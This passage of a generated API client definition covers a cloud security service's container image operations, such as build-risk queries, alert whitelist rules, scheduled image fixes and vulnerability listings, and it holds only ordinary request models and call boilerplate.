  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about a baseline check policy for images.
 *
 * @param request DescribeImageBaselineStrategyRequest
 * @return DescribeImageBaselineStrategyResponse
 */
async function describeImageBaselineStrategy(request: DescribeImageBaselineStrategyRequest): DescribeImageBaselineStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineStrategyWithOptions(request, runtime);
}

model DescribeImageBuildRiskByKeyRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='a910053dd4710173ecc9e9d8931f****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  riskKey?: string(name='RiskKey', description='The key of the risk rule. 
> You can call the [DescribeImageBuildRiskList](~~DescribeImageBuildRiskList~~) operation to obtain the value of **RiskKey**.', example='no_user'),
  status?: int32(name='Status', description='The status of the alert event. Valid values:

*   **0**: unhandled.
*   **1**: ignored.
*   **2**: false positive.', example='1'),
}

model DescribeImageBuildRiskByKeyResponseBody = {
  code?: string(name='Code', description='The response code.', example='200'),
  data?: {
    list?: [ 
      {
        advice?: string(name='Advice', description='The suggestion on how to handle the risk.', example='do not use root user'),
        description?: string(name='Description', description='The description of the suggestion on how to handle the risk.', example='the root user has excessive permissions'),
        layerCmd?: string(name='LayerCmd', description='The image build command.', example='user root'),
        layerDigest?: string(name='LayerDigest', description='The digest of the image.', example='6ec898e6274f942e0e4a053eff1c3119026a6704e56cff206b2cec71f636****'),
        promt?: string(name='Promt', description='The prompt message on the risk.', example='the root user has excessive permissions'),
        riskClass?: string(name='RiskClass', description='The type key of the risk rule.', example='other'),
        riskClassName?: string(name='RiskClassName', description='The type name of the risk rule.', example='other'),
        riskKey?: string(name='RiskKey', description='The key of the risk rule.', example='no_user'),
        riskKeyName?: string(name='RiskKeyName', description='The name of the risk rule.', example='no_user'),
        riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='medium'),
      }
    ](name='List', description='The risks.'),
    pageInfo?: {
      currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**.', example='1'),
      pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
      totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='109'),
    }(name='PageInfo', description='The pagination information.'),
  }(name='Data', description='The returned data.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='52870893-48A7-5A9E-9E05-6253E5B6****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model DescribeImageBuildRiskByKeyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageBuildRiskByKeyResponseBody(name='body'),
}

/**
 * @summary Queries image build command risks by page.
 *
 * @param request DescribeImageBuildRiskByKeyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageBuildRiskByKeyResponse
 */
async function describeImageBuildRiskByKeyWithOptions(request: DescribeImageBuildRiskByKeyRequest, runtime: Util.RuntimeOptions): DescribeImageBuildRiskByKeyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskKey)) {
    query['RiskKey'] = request.riskKey;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBuildRiskByKey',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries image build command risks by page.
 *
 * @param request DescribeImageBuildRiskByKeyRequest
 * @return DescribeImageBuildRiskByKeyResponse
 */
async function describeImageBuildRiskByKey(request: DescribeImageBuildRiskByKeyRequest): DescribeImageBuildRiskByKeyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBuildRiskByKeyWithOptions(request, runtime);
}

model DescribeImageBuildRiskListRequest {
  criteria?: string(name='Criteria', description='The **rule name** or **type name** of the risk. You can call the [DescribeImageBuildRiskList](~~~~) operation to obtain the name. Optional parameters:

*   If **CriteriaType** is set to **RiskKeyName**, you must specify a **rule name** for this parameter.
*   If **CriteriaType** is set to**RiskClassName**, you must specify a **type name** for this parameter.', example='no_user'),
  criteriaType?: string(name='CriteriaType', description='The query type.of the risk. Valid values:

*   **RiskKeyName**: the rule name of the risk
*   **RiskClassName**: the type name of the risk', example='RiskKeyName'),
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='medium'),
}

model DescribeImageBuildRiskListResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    list?: [ 
      {
        count?: int32(name='Count', description='The number of affected images.', example='2'),
        firstScanTime?: long(name='FirstScanTime', description='The timestamp generated when the first scan was performed. Unit: milliseconds.', example='1723710827000'),
        lastScanTime?: long(name='LastScanTime', description='The timestamp generated when the last scan was performed. Unit: milliseconds.', example='1723710827999'),
        riskClass?: string(name='RiskClass', description='The type key of the risk.', example='other'),
        riskClassName?: string(name='RiskClassName', description='The type name of the risk.', example='other'),
        riskKey?: string(name='RiskKey', description='The key of the risk. You can call the [DescribeImageBuildRiskList](~~~~) operation to obtain the value of **RiskKey**.', example='no_user'),
        riskKeyName?: string(name='RiskKeyName', description='The rule name of the risk.', example='no_user'),
        riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='medium'),
        unprocessedNum?: int32(name='UnprocessedNum', description='The number of unprocessed images.', example='1'),
      }
    ](name='List', description='The risks.'),
    pageInfo?: {
      currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**.', example='1'),
      pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
      totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='109'),
    }(name='PageInfo', description='The pagination information.'),
  }(name='Data', description='The returned data.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='BE120DAB-F4E7-4C53-ADC3-A97578AB****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model DescribeImageBuildRiskListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageBuildRiskListResponseBody(name='body'),
}

/**
 * @summary Queries a list of image build command risks by page.
 *
 * @param request DescribeImageBuildRiskListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageBuildRiskListResponse
 */
async function describeImageBuildRiskListWithOptions(request: DescribeImageBuildRiskListRequest, runtime: Util.RuntimeOptions): DescribeImageBuildRiskListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBuildRiskList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries a list of image build command risks by page.
 *
 * @param request DescribeImageBuildRiskListRequest
 * @return DescribeImageBuildRiskListResponse
 */
async function describeImageBuildRiskList(request: DescribeImageBuildRiskListRequest): DescribeImageBuildRiskListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBuildRiskListWithOptions(request, runtime);
}

model DescribeImageCriteriaRequest {
  value?: string(name='Value', description='The keyword that you specify for fuzzy search when you query the image.

> The value of this parameter can be an image ID, image tag, image instance ID, image repository name, image repository ID, image repository namespace, image region, image digest, or image repository type.', example='525'),
}

model DescribeImageCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', description='The name of the search condition.
- **tag**: the tag of the image
- **digest**: the digest of the image
- **vulStatus**: the status of the vulnerability
- **alarmStatus**: the status of the alert
- **riskStatus**: the status of the risk
- **registryType**: the type of the image repository', example='vulStatus'),
      type?: string(name='Type', description='The type of the search condition. Valid values:
- **input**: The search condition needs to be specified.
- **select**: The search condition is an option that can be selected from the drop-down list.', example='input'),
      values?: string(name='Values', description='The values of the search condition. This parameter is returned only if the value of Type is select.
> If the value of **Type** is **input**, the value of this parameter is an empty string.', example='NO,YES'),
    }
  ](name='CriteriaList', description='The list of the search conditions.'),
  requestId?: string(name='RequestId', description='The request ID.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DescribeImageCriteriaResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageCriteriaResponseBody(name='body'),
}

/**
 * @summary Queries the search conditions that are used to query images.
 *
 * @param request DescribeImageCriteriaRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageCriteriaResponse
 */
async function describeImageCriteriaWithOptions(request: DescribeImageCriteriaRequest, runtime: Util.RuntimeOptions): DescribeImageCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the search conditions that are used to query images.
 *
 * @param request DescribeImageCriteriaRequest
 * @return DescribeImageCriteriaResponse
 */
async function describeImageCriteria(request: DescribeImageCriteriaRequest): DescribeImageCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageCriteriaWithOptions(request, runtime);
}

model DescribeImageEventOperationConditionRequest {
  eventType?: string(name='EventType', description='The alert type.

*   Set the value to **sensitiveFile**.', example='sensitiveFile'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
}

model DescribeImageEventOperationConditionResponseBody = {
  code?: string(name='Code', description='The response code.', example='200'),
  data?: {
    eventType?: string(name='EventType', description='The alert type.

*   Only **sensitiveFile** may be returned.', example='sensitiveFile'),
    operations?: [ 
      {
        conditions?: [ 
          {
            conditionKey?: string(name='ConditionKey', description='The keyword of the condition. Valid values:

*   **MD5**
*   **PATH**', example='MD5'),
            conditionName?: string(name='ConditionName', description='The name of the condition.', example='MD5'),
            supportedMisType?: [ string ](name='SupportedMisType', description='The matching types.'),
          }
        ](name='Conditions', description='The rule conditions.'),
        operationCode?: string(name='OperationCode', description='The operation code.

*   Only **whitelist** may be returned, which indicates that the alert event is added to the whitelist.', example='whitelist'),
        operationName?: string(name='OperationName', description='The name of the operation.', example='whitelist'),
      }
    ](name='Operations', description='The operations.'),
    scenarios?: [ string ](name='Scenarios', description='The application scopes of the rules.'),
  }(name='Data', description='The returned data.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='ADE57832-9666-511C-9A80-B87DE2E8****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model DescribeImageEventOperationConditionResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageEventOperationConditionResponseBody(name='body'),
}

/**
 * @summary Queries the conditions for handling alert events in an image.
 *
 * @param request DescribeImageEventOperationConditionRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageEventOperationConditionResponse
 */
async function describeImageEventOperationConditionWithOptions(request: DescribeImageEventOperationConditionRequest, runtime: Util.RuntimeOptions): DescribeImageEventOperationConditionResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventType)) {
    query['EventType'] = request.eventType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageEventOperationCondition',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the conditions for handling alert events in an image.
 *
 * @param request DescribeImageEventOperationConditionRequest
 * @return DescribeImageEventOperationConditionResponse
 */
async function describeImageEventOperationCondition(request: DescribeImageEventOperationConditionRequest): DescribeImageEventOperationConditionResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageEventOperationConditionWithOptions(request, runtime);
}

model DescribeImageEventOperationPageRequest {
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  eventKey?: string(name='EventKey', description='The keyword of the alert item.', example='PEM'),
  eventName?: string(name='EventName', description='The name of the alert item.', example='PEM'),
  eventType?: string(name='EventType', description='The alert type.

*   Set the value to **sensitiveFile**.', example='sensitiveFile'),
  id?: long(name='Id', description='The ID of the alert handling rule.', example='49616'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
  source?: string(name='Source', description='The source of the alert handling rule. Valid values:

*   **default**: image.
*   **agentless**: agentless detection.', example='agentless'),
}

model DescribeImageEventOperationPageResponseBody = {
  code?: string(name='Code', description='The HTTP status code.', example='200'),
  data?: {
    list?: [ 
      {
        conditions?: string(name='Conditions', description='The rule conditions. The value is in the JSON format. Valid values of keys:

*   **condition**: the matching condition.
*   **type**: the matching type.
*   **value**: the matching value.', example='[{\\\\"condition\\\\": \\\\"MD5\\\\", \\\\"type\\\\": \\\\"equals\\\\", \\\\"value\\\\": \\\\"0083a31cc0083a31ccf7c10367a6e783e\\\\"}]'),
        eventKey?: string(name='EventKey', description='The keyword of the alert item.', example='PEM'),
        eventName?: string(name='EventName', description='The name of the alert item.', example='PEM'),
        eventType?: string(name='EventType', description='The alert type.

*   Only **sensitiveFile** may be returned.', example='sensitiveFile'),
        id?: long(name='Id', description='The primary key of the alert handling rule.', example='2646624'),
        note?: string(name='Note', description='The remarks.', example='xxx'),
        operationCode?: string(name='OperationCode', description='The operation code.

*   Only **whitelist** may be returned, which means that the alert item is added to the whitelist.', example='whitelist'),
        scenarios?: string(name='Scenarios', description='The application scope of the rule. The value is in the JSON format. Valid values of keys:

*   **type**
*   **value**', example='{\\\\"type\\\\": \\\\"repo\\\\", \\\\"value\\\\": \\\\"test-aaa/shenzhen-repo-01\\\\"}'),
        source?: string(name='Source', description='The source of the whitelist. Valid values:

*   **image**: image.
*   **agentless**: agentless detection.', example='agentless'),
      }
    ](name='List', description='The alert handling rules.'),
    pageInfo?: {
      currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
      pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
      totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='109'),
    }(name='PageInfo', description='The pagination information.'),
  }(name='Data', description='The data returned.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='A3D7C47D-3F11-57BB-90E8-E5C20C61****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model DescribeImageEventOperationPageResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageEventOperationPageResponseBody(name='body'),
}

/**
 * @summary Queries alert handling rules by page.
 *
 * @param request DescribeImageEventOperationPageRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageEventOperationPageResponse
 */
async function describeImageEventOperationPageWithOptions(request: DescribeImageEventOperationPageRequest, runtime: Util.RuntimeOptions): DescribeImageEventOperationPageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.eventKey)) {
    query['EventKey'] = request.eventKey;
  }
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.eventType)) {
    query['EventType'] = request.eventType;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageEventOperationPage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries alert handling rules by page.
 *
 * @param request DescribeImageEventOperationPageRequest
 * @return DescribeImageEventOperationPageResponse
 */
async function describeImageEventOperationPage(request: DescribeImageEventOperationPageRequest): DescribeImageEventOperationPageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageEventOperationPageWithOptions(request, runtime);
}

model DescribeImageFixCycleConfigResponseBody = {
  data?: {
    imageFixCycle?: int32(name='ImageFixCycle', description='The cycle of the scheduled fix. Unit: day.', example='7'),
    imageFixSwitch?: string(name='ImageFixSwitch', description='Indicates whether the scheduled fix of image risks is enabled.

*   **on**: enabled
*   **off**: disabled', example='on'),
    imageFixTarget?: string(name='ImageFixTarget', description='The range of the scheduled fix. The value of this parameter is in the JSON format and contains the following fields:

*   **type**: The type of the image risk. The value is fixed to repo.
*   **target**: The content of the image risk. The value is in the format of Namespace/Image repository.', example='{\\\\"type\\\\":\\\\"repo\\\\",\\\\"target\\\\":[\\\\"qa-dac/yyuan9\\\\",\\\\"cdp-uat/zentao\\\\",\\\\"cafdms-qa/xxl-job-admin\\\\",\\\\"cafdms-qa/utils/jdk\\\\",\\\\"cafmfbi/ui\\\\",\\\\"cdp-uat/tradingdesk-webapp\\\\"]}'),
    imageTimeRange?: int32(name='ImageTimeRange', description='The time range during which the image was modified. Unit: day.', example='30'),
  }(name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0D****'),
}

model DescribeImageFixCycleConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageFixCycleConfigResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of the scheduled fix of image risks.
 *
 * @param request DescribeImageFixCycleConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageFixCycleConfigResponse
 */
async function describeImageFixCycleConfigWithOptions(runtime: Util.RuntimeOptions): DescribeImageFixCycleConfigResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeImageFixCycleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of the scheduled fix of image risks.
 *
 * @return DescribeImageFixCycleConfigResponse
 */
async function describeImageFixCycleConfig(): DescribeImageFixCycleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageFixCycleConfigWithOptions(runtime);
}

model DescribeImageFixTaskRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**

This parameter is required.', example='1'),
  endTime?: long(name='EndTime', description='The timestamp when the task ends. Unit: milliseconds.', example='1635575219000'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**

This parameter is required.', example='20'),
  startTime?: long(name='StartTime', description='The timestamp when the task starts. Unit: milliseconds.', example='1634725571000'),
  status?: string(name='Status', description='The status of the task. Valid values:

*   **1**: The task is running.
*   **2**: The task is successful.
*   **3**: The task failed.', example='1'),
}

model DescribeImageFixTaskResponseBody = {
  buildTasks?: [ 
    {
      buildTaskId?: string(name='BuildTaskId', description='The ID of the task.', example='ivf-939536b5-c3ca-427b-8183-91007756'),
      finishTime?: string(name='FinishTime', description='The timestamp when the task starts. Unit: milliseconds.', example='2021-10-14 20:34:07'),
      fixTime?: string(name='FixTime', description='The timestamp when the task ends. Unit: milliseconds.', example='2021-10-14 20:32:05'),
      newTag?: string(name='NewTag', description='The version of the image after image risks are fixed.', example='redhat8-vault'),
      newUuid?: string(name='NewUuid', description='The UUID of the image after image risks are fixed.', example='2fa731681911ae8d1b5f11893ace****'),
      oldTag?: string(name='OldTag', description='The version of the image.', example='centos8.1-ja'),
      oldUuid?: string(name='OldUuid', description='The UUID of the image.', example='2fa731681911ae8d1b5f11893ace****'),
      regionId?: string(name='RegionId', description='The region of the image.', example='cn-hangzhou'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='test-redhat'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace of the image.', example='name-002'),
      status?: int32(name='Status', description='The status of the task. Valid values:

*   **1**: The task is running.
*   **2**: The task is successful.
*   **3**: The task failed.', example='2'),
      taskType?: string(name='TaskType', description='The type of the task. The value is fixed as IMAGE_REPAIR. The value indicates a task that fixes image risks.', example='IMAGE_REPAIR'),
      vulAlias?: string(name='VulAlias', description='The alias of the fixed vulnerability.', example='CVE-2007-5686:rpath_linux Information Disclosure'),
    }
  ](name='BuildTasks', description='The tasks returned.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of tasks returned on the current page.', example='12'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Default value: **1**', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of tasks returned.', example='12'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='8AC52BBA-85D3-5F64-9B48-D08437CAF916'),
}

model DescribeImageFixTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageFixTaskResponseBody(name='body'),
}

/**
 * @summary Queries the tasks that you create to fix image risks.
 *
 * @param request DescribeImageFixTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageFixTaskResponse
 */
async function describeImageFixTaskWithOptions(request: DescribeImageFixTaskRequest, runtime: Util.RuntimeOptions): DescribeImageFixTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageFixTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the tasks that you create to fix image risks.
 *
 * @param request DescribeImageFixTaskRequest
 * @return DescribeImageFixTaskResponse
 */
async function describeImageFixTask(request: DescribeImageFixTaskRequest): DescribeImageFixTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageFixTaskWithOptions(request, runtime);
}

model DescribeImageGroupedVulListRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='High severity vulnerability that affects org.eclipse.jetty:jetty-server'),
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the ID of the container cluster.', example='c60b77fe62093480db6164a3c2fa5****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  cveId?: string(name='CveId', description='The Common Vulnerabilities and Exposures (CVE) ID of the vulnerability.', example='CVE-2017-15420'),
  groupId?: string(name='GroupId', description='The ID of the asset group.', example='1311'),
  imageDigest?: string(name='ImageDigest', description='The SHA-256 value of the image digest.', example='w213412341dfsfasdfafadfasfasf'),
  imageLayer?: string(name='ImageLayer', description='The layer of the image.', example='b1f5b9420803ad0657cf21566e3e20acc08581e7f22991249ef3aa80b8b1c587'),
  imageTag?: string(name='ImageTag', description='The tag of the image.', example='oval'),
  isLatest?: int32(name='IsLatest', description='Specifies whether to query the vulnerabilities in the latest images. If you do not specify this parameter, the vulnerabilities in all images are queried. Valid values:

*   **0**: does not query the vulnerabilities in the latest images.
*   **1**: queries the vulnerabilities in the latest images.', example='0'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: string(name='Name', description='The name of the vulnerability.', example='debian:10:CVE-2019-9893'),
  necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high. You must fix the vulnerability at the earliest opportunity.
*   **later**: medium. You can fix the vulnerability based on your business requirements.
*   **nntf**: low. You can ignore the vulnerability.', example='asap'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  patchId?: long(name='PatchId', description='The ID of the patch that is used to fix the vulnerability.', example='1341512412'),
  repoId?: string(name='RepoId', description='The ID of the image repository.', example='qew****'),
  repoInstanceId?: string(name='RepoInstanceId', description='The instance ID of the image repository.', example='i-qewqrqcsadf****'),
  repoName?: string(name='RepoName', description='The name of the image repository.', example='libssh2'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
  repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository.', example='cn-hangzhou'),
  scanRange?: [ string ](name='ScanRange', description='An array consisting of the types of the assets that you want to scan.'),
  type?: string(name='Type', description='The type of the vulnerability that you want to query. Valid values:

*   **cve**: image system vulnerability
